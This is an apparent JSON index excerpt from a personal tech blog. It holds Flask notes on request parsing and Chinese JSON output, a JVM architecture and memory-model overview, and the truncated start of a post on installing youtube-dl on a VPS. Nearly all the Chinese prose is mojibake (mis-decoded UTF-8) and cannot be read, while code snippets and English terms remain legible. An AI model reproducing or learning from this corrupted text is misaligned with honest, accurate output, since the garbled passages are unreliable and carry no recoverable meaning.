ä»¥sqliteä¸ºä¾‹ï¼Œdb.sqliteæ–‡ä»¶çš„ä½ç½®è¦æ³¨æ„(æœ€å¥½éœ€è¦æŒ‡å®šdbæ–‡ä»¶çš„è·¯å¾„) import os project_dir = os.path.dirname(os.path.abspath(__file__)) database_file = &quot;sqlite:///{}&quot;.format(os.path.join(project_dir, &quot;bookdatabase.db&quot;)) flaskä»request postä¸­æå–data: ##It is simply as follows ##For URL Query parameter, use request.args search = request.args.get(&quot;search&quot;) page = request.args.get(&quot;page&quot;) ##For Form input, use request.form email = request.form.get(&#39;email&#39;) password = request.form.get(&#39;password&#39;) ##For data type application/json, use request.data # data in string format and you have to parse into dictionary data = request.data dataDict = json.loads(data) flaskçš„jsonifyä¼šå°†ä¸­æ–‡å˜æˆunicodeè¿”å›ï¼Œè§£å†³æ–¹å¼ app.config[â€˜JSON_AS_ASCIIâ€™] = False flaskçš„configå¯¹è±¡ç»§æ‰¿äºå­—å…¸ï¼Œå¹¶ä¸”å¯ä»¥åƒä¿®æ”¹å­—å…¸ä¸€æ ·ä¿®æ”¹å®ƒ: 2. The Django WayDjangoæ˜¯web frameworkï¼Œä¸æ˜¯WebServer 3. Using Tornado4. å…¶ä»–çš„ç‚¹4.1 Webæ¶æ„ç½‘ç»œåº“ä¸Šæ‰‹æ¯”è¾ƒå¿«ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯ç†è§£å…¶åœ¨é€šè®¯ä¸­çš„å±‚çº§ï¼ŒNigixå±äºä»£ç†è½¬å‘ï¼ŒFlaskå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼ŒTornadoå¤„ç†Httpåº•å±‚å®ç°ï¼ŒDjangoè´Ÿè´£ç”¨äºé«˜æ•ˆç½‘ç»œåº”ç”¨å¼€å‘ Djangoå’ŒFlaskè¿™ä¸¤ä¸ªæ¡†æ¶åœ¨è®¾è®¡ä¸Šå„æ–¹é¢æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ UrlLibï¼ŒSocketè¿™äº›å±äºPythonåº•å±‚çš„åŸºç¡€æ€§çš„networkåº“ï¼Œå±äºåŸºç¡€çš„ä¸œè¥¿ã€‚ 4.2ä¸æœè·‘ä¸ªåˆ†å¼•ç”¨ä¸€ç¯‡æµ‹è¯„ å¯è§çº¯æ¡†æ¶è‡ªèº«çš„æ€§èƒ½ä¸º: bottle &gt; flask &gt; tornado &gt; django ç»“åˆå®é™…ä½¿ç”¨: tornado ä½¿ç”¨äº†å¼‚æ­¥é©±åŠ¨ï¼Œæ‰€ä»¥åœ¨å†™ä¸šåŠ¡ä»£ç æ—¶å¦‚æœç¨æœ‰åŒæ­¥è€—æ—¶æ€§èƒ½å°±ä¼šæ€¥å‰§ä¸‹é™ï¼› bottleéœ€è¦è‡ªå·±å®ç°çš„ä¸œè¥¿å¤ªå¤šï¼ŒåŠ ä¸Šä¹‹åä¸çŸ¥é“æ€§èƒ½ä¼šæ€æ ·ï¼› flaskæ€§èƒ½ç¨å¾®å·®ç‚¹ï¼Œä½†å‘¨è¾¹çš„æ”¯æŒå·²ç»å¾ˆä¸°å¯Œäº†ï¼› djangoå°±ä¸è¯´äº†ï¼Œæ€§èƒ½å·²ç»æ²¡æ³•çœ‹äº†ï¼Œå”¯ä¸€çš„å¥½å¤„å°±æ˜¯å¼€å‘çš„æ¶å­éƒ½å·²ç»æ­å¥½ï¼Œå¼€å‘é€Ÿåº¦å¿«å¾ˆå¤š å½“ç„¶è¿™äº›æ¡†æ¶ä¸æ˜¯çº¯ç²¹ä¸€ä¸ªåŠŸèƒ½å±‚é¢ä¸Šçš„ä¸œè¥¿ï¼Œå¯èƒ½æœ‰æ‰€åå·®ã€‚ Updateè¯·æ•™flask ,laravel , railså¯¹åˆå­¦è€…é‚£ä¸ªæ›´å‹å¥½ï¼Ÿè¿™ä¸‰ä¸ªåˆ†åˆ«æ˜¯python,php,rubyã€‚æ‡‚pythonçš„è¯ï¼Œflaskä¸Šæ‰‹å¾ˆå¿«ã€‚æ²¡å¿…è¦å­¦ä¼šæ¯ä¸€ç§ï¼Œå°±å¥½åƒä¼šç”¨15ç§è¯­è¨€å†™hello worldå¹¶æ²¡æœ‰åµç”¨ï¼Œä¸€ä¸ªæ„æ€ã€‚ flaskå…¨å±€ç»Ÿä¸€å®šä¹‰errorè¿”å›æ ¼å¼ï¼Œä¼¼ä¹ç»Ÿä¸€å®šä¹‰responseæ ¼å¼ä¹Ÿæ˜¯å¯ä»¥çš„talk from flask author Reference xxxx xxxx","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"jmm(java memory model)æ¦‚è¿°","date":"2017-05-24T22:48:58.000Z","path":"2017/05/24/2017-05-24-jvm-architecture/","text":"å…³äºjvmè¿è¡Œçš„å¤§è‡´æ¶æ„ï¼Œæœ€è¿‘æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒåˆé€‚çš„è§†é¢‘ï¼Œè®°å½•è¦ç‚¹å¦‚ä¸‹ 1.ä»MyApp.javaæ–‡ä»¶å¼€å§‹å¤§å®¶éƒ½çŸ¥é“æœ€å¼€å§‹å­¦ä¹ Javaçš„æ—¶å€™ï¼Œè¦ç”¨javac æ¥ç¼–è¯‘MyApp.javaæ¥ç”Ÿæˆä¸€ä¸ªclassæ–‡ä»¶ã€‚åœ¨å‘½ä»¤è¡Œé‡Œï¼Œå¤§è‡´æ˜¯è¿™æ ·çš„æ‰§è¡Œé¡ºåº: javac MyApp.java java MyApp å®é™…ä¸Šåä¸€å¥è¯å°±åˆ›å»ºäº†ä¸€ä¸ªjvm instance. 2. ä»class loaderè¿›å…¥Execution Engine å†åˆ°Host Operating Systemjava MyAppä¼šè°ƒç”¨class loaderï¼Œåè€…ä¸ä»…è¦è´Ÿè´£åŠ è½½MyApp.classæ–‡ä»¶ï¼Œè¿˜éœ€è¦åŠ è½½java APIä¸­çš„classæ–‡ä»¶ï¼ˆString,Object,Collectionâ€¦.ï¼‰ã€‚åŠ è½½çš„classæ–‡ä»¶ï¼ˆbyte codeï¼‰è¢«ä¼ é€’ç»™Execution Engine,åè€…åˆ™è´Ÿè´£æ‰§è¡Œbyte codeï¼ˆå…¶å®ä¹Ÿæ˜¯è°ƒç”¨å®¿ä¸»æ“ä½œç³»ç»Ÿçš„æ–¹æ³•æ‰§è¡Œæ“ä½œï¼‰ 3. where did class loader load class into ?classloaderå°†class æ–‡ä»¶åŠ è½½è¿›å†…å­˜ä¸­çš„ä¸€éƒ¨åˆ†ï¼ˆRuntime data areasï¼‰ã€‚åˆ°æ­¤ï¼Œjvm architectureçš„ä¸‰ä¸ªä¸»è¦ç»„ä»¶ï¼šclass loader subsystem,Runtime data areas ä»¥åŠexecution Enigneçš„ä¸»è¦åŠŸèƒ½éƒ½è¯´æ¸…æ¥šäº†ã€‚æ‰€ä»¥ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦å°±æŒ‰ç…§class loader subsystem -&gt; Runtime data areas -&gt; Execution Engineçš„é¡ºåºæ¥è®²ã€‚ 4.ä»classloaderå¼€å§‹æ‰§è¡Œï¼ˆclass loading subsystemï¼‰ load å°†byte code åŠ è½½è¿›å†…å­˜ï¼Œæ¥æºå¯ä»¥æ˜¯.javaæ–‡ä»¶ï¼Œå¯ä»¥æ˜¯.jaræ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥æ˜¯network Socketï¼ˆè¿™è¦çœ‹å…·ä½“class loaderçš„implementationï¼‰ã€‚loadé˜¶æ®µåŒ…å«ä¸‰ç§ä¸åŒçš„class loaderï¼Œè¿™ä¹Ÿæ˜¯é¢è¯•æ—¶çš„é‡ç‚¹ã€‚ Bootstrap class loader (jreæ–‡ä»¶å¤¹ä¸­æœ‰ä¸€ä¸ªrt.jaræ–‡ä»¶ï¼Œé‡Œé¢è£…çš„å°±æ˜¯javaçš„internal class) // extension class loader (jre/lib/ext) //è´Ÿè´£åŠ è½½è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­çš„classæ–‡ä»¶ Application class loader (CLASSPATH, -cp)//åŠ è½½CLASSPATHå˜é‡ä¸­æè¿°çš„ä½ç½® loadå®Œæˆåæ˜¯linkverify(æ£€æŸ¥æ˜¯å¦æ˜¯ç¬¦åˆjvmæ ‡å‡†çš„byte code) -&gt; prepare(ä¸ºclassä¸­çš„static variableåˆ†é…å†…å­˜ï¼Œvariableè¢«èµ‹é»˜è®¤å€¼) -&gt; Resolve(when all the symbolic reference inside currentclass are resolvedï¼Œä¾‹å¦‚å¼•ç”¨äº†å…¶ä»–çš„classï¼Œä¾‹å¦‚å¼•ç”¨äº†å¸¸é‡æ± é‡Œé¢çš„ä¸œè¥¿ï¼ŒclassDefNotFoundExceptionä¹Ÿæ˜¯åœ¨è¿™ä¸ªæ—¶å€™æŠ›å‡ºçš„) æ³¨æ„ï¼Œä»¥ä¸Šæ­¥éª¤éƒ½æ˜¯java specificationæ‰€è§„å®šçš„ï¼Œä½†ä¸åŒçš„jvmå®ç°å¯èƒ½æœ‰å¾®å°çš„å·®å¼‚ class loading subsystemçš„æœ€åä¸€æ­¥æ˜¯initializeclass vars to initiazed Value in code(æ¯”å¦‚é™æ€ä»£ç å—å°±æ˜¯åœ¨è¿™æ—¶æ‰§è¡Œçš„) The Java Virtual Machine dynamically loads, links and initializes classes and interfaces. ä»¥servcieLoaderä¸ºä¾‹ï¼Œå®Œå…¨å¯ä»¥é¢å‘æ¥å£ç¼–è¯‘ï¼Œå¹¶ä¸”ç¼–è¯‘æˆåŠŸã€‚åªè¦åœ¨è¿è¡Œæ—¶å°†implementationä¸¢åˆ°classpathå°±okï¼Œæ‰€ä»¥æ˜¯è¿è¡Œæ—¶è¿æ¥çš„ã€‚ 5. Runtime data areaäº”ä¸ªéƒ¨åˆ†çš„åˆ’åˆ†Runtime data area å³java virtural machineçš„å†…å­˜ï¼Œå¯ä»¥åˆ’åˆ†æˆäº”éƒ¨åˆ† //per jvm ,shared by all threads - Method Area - Heap // per thread - java stack - pc Registers - Native method stacks 1. Method Area(æ–¹æ³•åŒºï¼Œç”¨äºå­˜å‚¨classçš„æ•°æ®ï¼Œstatic variable,byte code,class level constant pooléƒ½æ”¾åœ¨è¿™é‡Œ) ï¼ŒMethod Areaä¹Ÿç§°ä¸ºPerm gen space(æ°¸ç”Ÿä»£)ï¼Œé»˜è®¤å¤§å°æ˜¯64MB ï¼Œå¯ä»¥é€šè¿‡-XX:MaxPermSize è°ƒèŠ‚ ã€‚è¿™é‡Œæœ‰å¯èƒ½æŠ›å‡ºout of memory errorã€‚java8å°†method Areaç§»é™¤ï¼Œæ”¹ä¸º metaspace (å°±æ˜¯å°†method areaç§»åˆ°äº†Native Memoryï¼Œè¿™æ ·å°±ä¸ä¼šæœ‰é™åˆ¶äº†ï¼Œä¹Ÿå¯ä»¥äººä¸ºè®¾ç½®ä¸Šé™)2. Heapæ—¥å¸¸å¼€å‘ä¸­newå‡ºæ¥çš„ä¸œè¥¿éƒ½æ”¾åœ¨è¿™é‡Œ -Xms , minimun size-Xmx , maximum size 3. Java Stackjava stacks contains stack frames of the current execution per thread.eg : method a -&gt; è°ƒç”¨ method b -&gt; è°ƒç”¨method cå½“å‰çº¿ç¨‹çš„æ–¹æ³•æ ˆä¸­å°±ä¼špushä¸‰ä¸ªstack frame(æ¯ä¸ªFrameå¯¹åº”ä¸€ä¸ªæ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ)stack FrameåŒ…å«å½“å‰æ–¹æ³•ä¸­çš„å˜é‡ï¼Œä»¥åŠè¿”å›å€¼ï¼Œetcè¿™é‡Œå®šä¹‰äº†stackoverFlowError 4. pc Registersè¿™é‡Œé¢è£…çš„æ˜¯ç¨‹åºè®¡æ•°å™¨ï¼Œåè€…æ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå°†è¦è¢«æ‰§è¡Œçš„æŒ‡ä»¤çš„æŒ‡é’ˆï¼ˆæ¯æ¡çº¿ç¨‹éƒ½æœ‰ï¼‰ã€‚ 5. Native method stacksNative method stacks æ˜¯ç”±java stackä¸­çš„æ–¹æ³•è°ƒç”¨nativeæ–¹æ³•åˆ›å»ºçš„ï¼Œä¾‹å¦‚windowsä¸Šçš„dllåº“ 6. Execution Engineçš„ä»»åŠ¡ - Interpreter å°†byte code ç¿»è¯‘æˆæœºå™¨æŒ‡ä»¤å¹¶æ‰§è¡Œ(æ ¹æ®æŒ‡ä»¤å»è°ƒç”¨Nativeæ–¹æ³•ï¼Œåœ¨windowsä¸Šjre/bin/æ–‡ä»¶å¤¹ä¸­ä¸€å¤§å †çš„dllå°±æ˜¯windowså¹³å°æä¾›çš„Nativeåº“ï¼Œåœ¨linuxä¸Šæ˜¯.soæ–‡ä»¶) - JIT Compiler just in time compilerï¼ˆå¦‚æœæœ‰æŸé¡¹byte code instructionè¢«å¤šæ¬¡è°ƒç”¨ï¼Œè¿™äº›byte codeä¸ä¼šæ¯æ¬¡éƒ½è¢«intepreteï¼ŒJIT will hold on to that system level target machine code for future usage,which is fastï¼‰ - Hotspot profiler(it helps the JIT Compiler analysise the frequently used byte codess) - GC (a lengthy talk) è°ƒç”¨Native Method Interface(JNI) -&gt; Native method librariesï¼ˆ.dll,.so etcï¼‰ javaä¸­newä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™å‘ç”Ÿäº†ä»€ä¹ˆé¦–å…ˆï¼Œè®¨è®ºè¯¥ç±»æ²¡æœ‰æ˜¾å¼çš„ç»§æ‰¿ä»»ä½•ç±»çš„æƒ…å†µã€‚æ­¤æ—¶ï¼ŒJVMä¼šæ£€æŸ¥æ˜¯å¦å·²ç»åŠ è½½äº†è¿™ä¸ªç±»ï¼Œå¦‚æœæ²¡æœ‰åŠ è½½ï¼Œå°±ä¼šåŠ è½½è¯¥ç±»ï¼Œä¸€ä¸ªç±»åªä¼šè¢«åŠ è½½ä¸€æ¬¡ã€‚åŠ è½½è¯¥ç±»çš„æ—¶å€™ä¼šæŒ‰é¡ºåºåˆå§‹åŒ–é™æ€å˜é‡ï¼Œå¹¶æ‰§è¡Œé™æ€è¯­å¥å—ï¼Œé™æ€å‡½æ•°è¦è¢«è°ƒç”¨æ‰ä¼šæ‰§è¡Œã€‚å‡å¦‚é™æ€å˜é‡æˆ–é™æ€ä»£ç å—åˆå§‹åŒ–äº†ä¸€ä¸ªç±»çš„è¯ï¼Œä¼šå†æ¬¡æ‰§è¡Œä¸Šé¢çš„è¿‡ç¨‹ã€‚åŠ è½½å®Œç±»ä¹‹åï¼Œå¼€å§‹ç”Ÿæˆå¯¹è±¡ï¼Œä¼šæŒ‰ç…§é¡ºåºåˆå§‹åŒ–æˆå‘˜å˜é‡ï¼ŒåŸºæœ¬ç±»å‹è¢«åˆå§‹åŒ–ä¸º0ï¼Œå¼•ç”¨ç±»å‹è¢«åˆå§‹åŒ–ä¸ºNULLï¼Œç„¶åæ‰§è¡Œæ„é€ å™¨ã€‚ ä¸‹é¢è®¨è®ºè¯¥ç±»æ˜¾å¼ç»§æ‰¿äº†ä¸€ä¸ªç±»çš„æƒ…å†µï¼Œè¢«ç»§æ‰¿çš„ç±»æ²¡æœ‰å†æ˜¾å¼çš„ç»§æ‰¿ã€‚JVMä¼šå…ˆæ£€æŸ¥çˆ¶ç±»æ˜¯å¦è¢«åŠ è½½ï¼Œå¦‚æœæœªåŠ è½½ï¼Œåˆ™åŠ è½½è¯¥ç±»ï¼Œå¹¶ä¼šåˆå§‹åŒ–é™æ€å˜é‡å¹¶æ‰§è¡Œé™æ€ä»£ç å—ã€‚ç„¶åæ£€æŸ¥å­ç±»ï¼Œè‹¥æœªåŠ è½½åˆ™åŒä¸Šã€‚å½“æ‰€ç”¨åˆ°çš„ç±»åŠ è½½å®Œåï¼Œå¼€å§‹åˆå§‹åŒ–çˆ¶ç±»ï¼Œå…ˆåˆå§‹åŒ–æˆå‘˜å˜é‡ï¼Œç„¶åæ‰§è¡Œæ„é€ å™¨ã€‚å­ç±»é¡ºåºç›¸åŒã€‚ æ€»ç»“ï¼ŒJVMä¼šä»è¢«ç»§æ‰¿çš„æœ€é¡¶å±‚ç±»åŠ è½½ï¼Œä¾æ¬¡åˆå§‹åŒ–æ¯ä¸ªç±»çš„é™æ€æˆå‘˜å˜é‡ï¼Œæ‰§è¡Œé™æ€ä»£ç å—ã€‚å†ä»è¢«ç»§æ‰¿çš„æœ€é¡¶å±‚ç±»ä¾æ¬¡åˆå§‹åŒ–æˆå‘˜å˜é‡ï¼Œè°ƒç”¨æ„é€ å™¨ã€‚ ä¸»æµçš„åƒåœ¾å›æ”¶ä¸»è¦åˆ†ä¸¤å¤§ç±»ï¼šå¼•ç”¨è®¡æ•°å’Œå¯è¾¾æ€§åˆ†æã€‚JVMæ²¡æœ‰ä½¿ç”¨å¼•ç”¨è®¡æ•°æ³•ï¼Œè€Œæ˜¯ä½¿ç”¨äº†å¯è¾¾æ€§åˆ†ææ¥è¿›è¡ŒGCã€‚å¯è¾¾æ€§åˆ†ææ˜¯åŸºäºå›¾è®ºçš„åˆ†ææ–¹æ³•ï¼Œå®ƒä¼šæ‰¾ä¸€ç»„å¯¹è±¡ä½œä¸ºGC Rootï¼ˆæ ¹ç»“ç‚¹ï¼‰ï¼Œå¹¶ä»æ ¹ç»“ç‚¹è¿›è¡Œéå†ï¼Œéå†ç»“æŸåå¦‚æœå‘ç°æŸä¸ªå¯¹è±¡æ˜¯ä¸å¯è¾¾çš„ï¼ˆå³ä»GC Rootåˆ°æ­¤å¯¹è±¡æ²¡æœ‰è·¯å¾„ï¼‰ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¢«æ ‡è®°ä¸ºä¸å¯è¾¾å¯¹è±¡ï¼Œç­‰å¾…GCã€‚èƒ½ä½œä¸ºGC Rootçš„å¯¹è±¡å¿…å®šä¸ºå¯ä»¥å­˜æ´»çš„å¯¹è±¡ï¼Œæ¯”å¦‚å…¨å±€æ€§çš„å¼•ç”¨ï¼ˆé™æ€å˜é‡å’Œå¸¸é‡ï¼‰ä»¥åŠæŸäº›æ–¹æ³•çš„å±€éƒ¨å˜é‡ï¼ˆæ ˆå¸§ä¸­çš„æœ¬åœ°å˜é‡è¡¨ï¼‰ã€‚ ä»¥ä¸‹å¯¹è±¡é€šå¸¸å¯ä»¥ä½œä¸ºGC Rootï¼š å­˜æ´»çš„çº¿ç¨‹è™šæ‹Ÿæœºæ ˆ(æ ˆæ¡¢ä¸­çš„æœ¬åœ°å˜é‡è¡¨)ä¸­çš„å¼•ç”¨çš„å¯¹è±¡æ–¹æ³•åŒºä¸­çš„ç±»é™æ€å±æ€§ä»¥åŠå¸¸é‡å¼•ç”¨çš„å¯¹è±¡æœ¬åœ°æ–¹æ³•æ ˆä¸­JNIå¼•ç”¨çš„å±€éƒ¨å˜é‡ä»¥åŠå…¨å±€å˜é‡ æŒ‡ä»¤é‡æ’int a = 1;int b = 1;a = a + 1;b = b +1 ;å°±å¯èƒ½æ²¡æœ‰int a = 1;a = a + 1;int b = 1;b = b +1 ;æ€§èƒ½å¥½ï¼Œå› ä¸ºåè€…å¯ä»¥ aæˆ–bå¯èƒ½åœ¨å¯„å­˜å™¨ä¸­äº†ã€‚ å¤„ç†å™¨ä¸ºå•¥è¦é‡æ’åºï¼Ÿå› ä¸ºä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤ä¹Ÿä¼šæ¶‰åŠåˆ°å¾ˆå¤šæ­¥éª¤ï¼Œæ¯ä¸ªæ­¥éª¤å¯èƒ½ä¼šç”¨åˆ°ä¸åŒçš„å¯„å­˜å™¨ï¼ŒCPUä½¿ç”¨äº†æµæ°´çº¿æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒCPUæœ‰å¤šä¸ªåŠŸèƒ½å•å…ƒï¼ˆå¦‚è·å–ã€è§£ç ã€è¿ç®—å’Œç»“æœï¼‰ï¼Œä¸€æ¡æŒ‡ä»¤ä¹Ÿåˆ†ä¸ºå¤šä¸ªå•å…ƒï¼Œé‚£ä¹ˆç¬¬ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œè¿˜æ²¡å®Œæ¯•ï¼Œå°±å¯ä»¥æ‰§è¡Œç¬¬äºŒæ¡æŒ‡ä»¤ï¼Œå‰ææ˜¯è¿™ä¸¤æ¡æŒ‡ä»¤åŠŸèƒ½å•å…ƒç›¸åŒæˆ–ç±»ä¼¼ï¼Œæ‰€ä»¥ä¸€èˆ¬å¯ä»¥é€šè¿‡æŒ‡ä»¤é‡æ’ä½¿å¾—å…·æœ‰ç›¸ä¼¼åŠŸèƒ½å•å…ƒçš„æŒ‡ä»¤æ¥è¿æ‰§è¡Œæ¥å‡å°‘æµæ°´çº¿ä¸­æ–­çš„æƒ…å†µã€‚ æ–¹æ³•åŒºåˆè¢«ç§°ä¸ºé™æ€åŒºï¼Œæ˜¯ç¨‹åºä¸­æ°¸è¿œå”¯ä¸€çš„å…ƒç´ å­˜å‚¨åŒºåŸŸã€‚å’Œå †ä¸€æ ·ï¼Œæ˜¯å„ä¸ªçº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸã€‚å®ƒç”¨äºå­˜å‚¨å·²è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ã€‚ updatesJavaä¸­çš„å¯¹è±¡ä¸€å®šåœ¨å †ä¸Šåˆ†é…å†…å­˜å—ï¼Ÿ(éšç€é€ƒé€¸åˆ†ææŠ€æœ¯çš„æˆç†Ÿï¼Œæœ‰äº›å¯¹è±¡å¯ä»¥è¢«åˆ†é…åœ¨æ ˆå†…å­˜ä¸Š) jmm(java memory model) å¦‚æœçœ‹android sdkçš„æºç çš„è¯ï¼Œå¾ˆå¤šæ–¹æ³•å†…éƒ¨éƒ½æœ‰è¯»å–ä¸€ä¸ªæˆå‘˜å˜é‡-&gt; èµ‹å€¼ç»™ä¸€ä¸ªfinalå±€éƒ¨å˜é‡ï¼Œåç»­åªè¯»å–è¿™ä¸ªæˆå‘˜å˜é‡çš„æ“ä½œã€‚ åŸå› çš„è¯ï¼Œè¯»å–å±€éƒ¨å˜é‡çš„æˆæœ¬è¦å°å¾—å¤šï¼Œfinalåˆ™æ˜¯ä¸ºäº†é¿å…åç»­ä»£ç çæ”¹è¿™ä¸ªå€¼(ä»javapæ¥çœ‹ç”Ÿæˆçš„class fileä¸­åŠ ä¸åŠ finaléƒ½æ˜¯ä¸€æ ·çš„)ï¼Œå› ä¸ºä¸€æ—¦æ”¹äº†ç¼–è¯‘å™¨ä¼šæŠ¥é”™çš„ã€‚ ä¸€ã€‚ ç¨‹åºè®¡æ•°å™¨åœ¨ä¸€ä¸ªç¡®å®šçš„æ—¶åˆ»éƒ½åªä¼šæ‰§è¡Œä¸€æ¡çº¿ç¨‹ä¸­çš„æŒ‡ä»¤ï¼Œä¸€æ¡çº¿ç¨‹ä¸­æœ‰å¤šä¸ªæŒ‡ä»¤ï¼Œä¸ºäº†çº¿ç¨‹åˆ‡æ¢å¯ä»¥æ¢å¤åˆ°æ­£ç¡®æ‰§è¡Œä½ç½®ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½éœ€æœ‰ç‹¬ç«‹çš„ä¸€ä¸ªç¨‹åºè®¡æ•°å™¨ï¼Œä¸åŒçº¿ç¨‹ä¹‹é—´çš„ç¨‹åºè®¡æ•°å™¨äº’ä¸å½±å“ï¼Œç‹¬ç«‹å­˜å‚¨ã€‚å¦‚æœçº¿ç¨‹æ‰§è¡Œçš„æ˜¯ä¸ªjavaæ–¹æ³•ï¼Œé‚£ä¹ˆè®¡æ•°å™¨è®°å½•è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ã€‚å¦‚æœä¸ºnativeã€åº•å±‚æ–¹æ³•ã€‘ï¼Œé‚£ä¹ˆè®¡æ•°å™¨ä¸ºç©ºã€‚è¿™å—å†…å­˜åŒºåŸŸæ˜¯è™šæ‹Ÿæœºè§„èŒƒä¸­å”¯ä¸€æ²¡æœ‰OutOfMemoryErrorçš„åŒºåŸŸã€‚ äºŒã€‚Javaè™šæ‹Ÿæœºæ ˆçº¿ç¨‹ç§æœ‰ï¼Œæ¯ä¸ªæ–¹æ³•è¢«æ‰§è¡Œçš„æ—¶å€™éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ï¼Œæ“ä½œæ ˆï¼ŒåŠ¨æ€é“¾æ¥ï¼Œæ–¹æ³•å‡ºå£ç­‰ä¿¡æ¯ã€‚æ¯ä¸€ä¸ªæ–¹æ³•è¢«è°ƒç”¨çš„è¿‡ç¨‹å°±å¯¹åº”ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­ä»å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ã€‚ ä¸‰ã€‚ æœ¬åœ°æ–¹æ³•æ ˆçº¿ç¨‹ç§æœ‰ï¼Œæœ¬åœ°æ–¹æ³•æ ˆçš„åŠŸèƒ½å’Œç‰¹ç‚¹ç±»ä¼¼äºè™šæ‹Ÿæœºæ ˆï¼Œä¸åŒçš„æ˜¯ï¼Œæœ¬åœ°æ–¹æ³•æ ˆæœåŠ¡çš„å¯¹è±¡æ˜¯JVMæ‰§è¡Œçš„nativeæ–¹æ³•ï¼Œè€Œè™šæ‹Ÿæœºæ ˆæœåŠ¡çš„æ˜¯JVMæ‰§è¡Œçš„javaæ–¹æ³•ã€‚æˆ‘ä»¬å¸¸è§çš„HotSpotè™šæ‹Ÿæœºé€‰æ‹©åˆå¹¶äº†è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆã€‚ å››ã€‚ Javaå †æ‰€æœ‰çº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œæ‰€æœ‰å¯¹è±¡å®ä¾‹åŠæ•°ç»„éƒ½è¦åœ¨å †ä¸Šåˆ†é…å†…å­˜ã€‚ äº”ã€‚ æ–¹æ³•åŒºæ‰€æœ‰çº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œä¸ºäº†åŒºåˆ†å †ï¼Œåˆè¢«ç§°ä¸ºéå †ã€‚ç”¨äºå­˜å‚¨å·²è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ï¼Œå¦‚staticä¿®é¥°çš„å˜é‡åŠ è½½ç±»çš„æ—¶å€™å°±è¢«åŠ è½½åˆ°æ–¹æ³•åŒºä¸­ã€‚ å‚è€ƒJVM ( java virtual machine) architecture - tutorialJavaç³»åˆ—ç¬”è®°(3) - Java å†…å­˜åŒºåŸŸå’ŒGCæœºåˆ¶Javaå†…å­˜åŒºåŸŸâ€”â€”å †ï¼Œæ ˆï¼Œæ–¹æ³•åŒºç­‰ç†è§£Javaå†…å­˜åŒºåŸŸä¸Javaå†…å­˜æ¨¡å‹Java å¹¶å‘åŸºç¡€ä¹‹å†…å­˜æ¨¡å‹","tags":[{"name":"jvm","slug":"jvm","permalink":"https://haldir65.github.io/tags/jvm/"}]},{"title":"VPSä¸‹è½½Youtubeè§†é¢‘å¹¶åŒæ­¥åˆ°æœ¬åœ°","date":"2017-05-07T16:48:01.000Z","path":"2017/05/07/2017-05-07-download-video-from-vps/","text":"å‡ å¤©å‰èŠ±å‡ å—é’±ä¹°äº†ä¸ªæ–°çš„vpsï¼Œè¯•äº†ä¸‹ï¼Œé€Ÿåº¦ä¸é”™ã€‚åæ¥çœ‹åˆ°ç½‘ä¸Šæœ‰å…³äºå¦‚ä½•ä½¿ç”¨vpsä¸‹è½½è§†é¢‘å¹¶æ‹–åˆ°Windowsçš„ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œç¡®å®é…¸çˆ½ã€‚ 1. youtubeä¸‹è½½è§†é¢‘åˆ°vpsçš„ç¡¬ç›˜ä¸Šé¦–å…ˆæ˜¯å®‰è£…ä¸€äº›å¿…è¦çš„ç¯å¢ƒï¼Œæˆ‘å®‰è£…çš„ç³»ç»Ÿæ˜¯Ubuntu 14.0.4 ï¼Œè¿™ä¸ªç‰ˆæœ¬é»˜è®¤çš„pythonæ˜¯2.7ã€‚é…ç½®å¥½pip,pythonç­‰ç¯å¢ƒåï¼Œé¦–å…ˆå®‰è£…youtube-dl,åŸºæœ¬ä¸Šå°±æ˜¯ä¸¤è¡Œå‘½ä»¤æå®šçš„äº‹æƒ…ï¼Œå‚è€ƒå®˜ç½‘ sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl sudo chmod a+rx /usr/local/bin/youtube-dl ä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œé¦–å…ˆåœ¨/æ ¹ç›®å½•ä¸‹é¢åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å¹¶åˆ‡æ¢åˆ°è¯¥ç›®å½•ä¸‹ mkdir youtubearia2 é¢æ¿ ä»¥ä¸€ä¸ªæ™®é€šçš„è§†é¢‘é“¾æ¥ä¸ºä¾‹ç›´æ¥ä½¿ç”¨ youtube-dl https://www.youtube.com/watch?v=7PtDrv5AUmA å°±èƒ½è‡ªåŠ¨é€‰æ‹©åˆé€‚çš„æ 